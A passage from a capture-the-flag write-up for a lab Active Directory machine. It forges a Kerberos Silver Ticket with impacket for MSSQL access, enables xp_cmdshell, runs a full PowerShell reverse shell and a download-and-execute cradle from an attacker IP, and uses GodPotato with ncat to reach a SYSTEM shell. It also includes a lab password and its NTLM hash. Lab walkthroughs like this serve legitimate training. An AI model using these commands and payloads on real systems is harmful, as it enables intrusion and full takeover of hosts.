2. **Service Verification**: The service validates the ticket using its own NTLM hash (not the KDC's key)
3. **Forgery Opportunity**: If an attacker obtains a service account's NTLM hash, they can forge valid TGS tickets for that service

**Why This Attack Works:**
- Service accounts use their NTLM hash to encrypt service tickets
- If we have the service account's password/hash, we can create valid tickets
- The service validates tickets locally without checking with the KDC
- We can impersonate any user (including Administrator) for that specific service
#### Attack Requirements

To create a Silver Ticket, we need:
1. **Service NTLM Hash**: The NTLM hash of the service account (`sqlsvc`)
2. **Domain SID**: Security Identifier of the domain
3. **Service SPN**: Service Principal Name of the target service
4. **Target User**: User to impersonate in the ticket

Going back to `bloodhound` I find that user `sqlsvc` has a `SPN`set hence I could perform a Silver Ticket attack and access the service with admin privileges

![image](Pasted image 20251021003712.png)
#### Requirements Gathering

- **Service Account**: `sqlsvc`
- **NTLM Hash:** `58655C0B90B2492F84FB46FA78C2D96A` (derived from password `SurenessBlob85`)
- **Domain SID:** `S-1-5-21-3085872742-570972823-736764132` (from BloodHound)
- **Service SPN:** `sqlsvc/dc.sendai.vl` (SQL Server service)
- **Target User:** `administrator`

#### Calculating NTLM Hash
The NTLM hash can be calculated from the plaintext password:
```
echo -n 'SurenessBlob85' | iconv -t utf16le | openssl md4
MD4(stdin)= 58655c0b90b2492f84fb46fa78c2d96a
```
#### Ticket Forging
Creating Silver Ticket for SQL Server access using `impacket-ticketer`:
```
impacket-ticketer -spn 'sqlsvc/dc.sendai.vl' -user sqlsvc -p SurenessBlob85 -domain sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132  administrator -nthash 58655C0B90B2492F84FB46FA78C2D96A
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sendai.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```
**What This Command Does:**

- Creates a forged TGS ticket for the SQL Server service
- Impersonates the `administrator` user
- Signs the ticket with the `sqlsvc` account's NTLM hash
- The SQL Server will accept this as a valid administrator ticket

#### Authenticated SQL Access

Using the Silver Ticket for privileged SQL access:
```
export KRB5CCNAME=administrator.ccache

klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@SENDAI.VL

Valid starting       Expires              Service principal
10/21/2025 00:37:57  10/19/2035 00:37:57  sqlsvc/dc.sendai.vl@SENDAI.VL
        renew until 10/19/2035 00:37:57

proxychains impacket-mssqlclient dc.sendai.vl -k -no-pass
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.77.37:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SENDAI\Administrator  dbo@master)> 
```

### Command Execution
With administrative access, we can now enable and use `xp_cmdshell`:
```
SQL (SENDAI\Administrator  dbo@master)> xp_cmdshell whoami
ERROR(DC\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (SENDAI\Administrator  dbo@master)> enable_xp_cmdshell 
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SENDAI\Administrator  dbo@master)> RECONFIGURE
SQL (SENDAI\Administrator  dbo@master)> xp_cmdshell whoami
output          
-------------   
sendai\sqlsvc   

NULL            

SQL (SENDAI\Administrator  dbo@master)>
```
### Reverse Shell
Uploading and executing a PowerShell reverse shell:

**Reverse Shell Payload:**
```
cat shell.ps1      
$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.210', 9001);
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
    $StreamWriter.Write($String + 'SHELL> ');
    $StreamWriter.Flush()
}
WriteToStream '';
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
    $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}
    WriteToStream ($Output)
}
$StreamWriter.Close()

```
**Execution:**
```
SQL (SENDAI\Administrator  dbo@master)> EXEC xp_cmdshell 'powershell -c "iex((New-Object Net.WebClient).DownloadString(''http://10.10.14.210:8000/shell.ps1''))"';
```
### Token Impersonation
Checking for privilege escalation vectors:
```
SHELL> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SHELL>
```
**Key Privilege:** `SeImpersonatePrivilege` (Enabled)
To abuse this I need to upload both [Godpotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) and a [Netcat binary](https://github.com/andrew-d/static-binaries/) to the machine
```
SHELL> cd /programdata
SHELL> curl http://10.10.14.210:8000/GodPotato-NET4.exe -o GodPotato-NET4.exe
SHELL> curl http://10.10.14.210:8000/ncat.exe -o ncat.exe
SHELL>
```
Then I will run the potato and start up a `netcat` listener on my host machine
```
SHELL> .\GodPotato-NET4.exe -cmd "ncat.exe 10.10.14.210 9001 -e cmd"

```
## Domain Compromise
Successfully received SYSTEM shell:
```
rlwrap nc -nlvp 9001   
listening on [any] 9001 ...
connect to [10.10.14.210] from (UNKNOWN) [10.129.77.37] 54582
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\programdata>whoami
whoami
nt authority\system

C:\programdata>
```
Root flag located at: `C:\Users\Administrator\Desktop\root.txt``
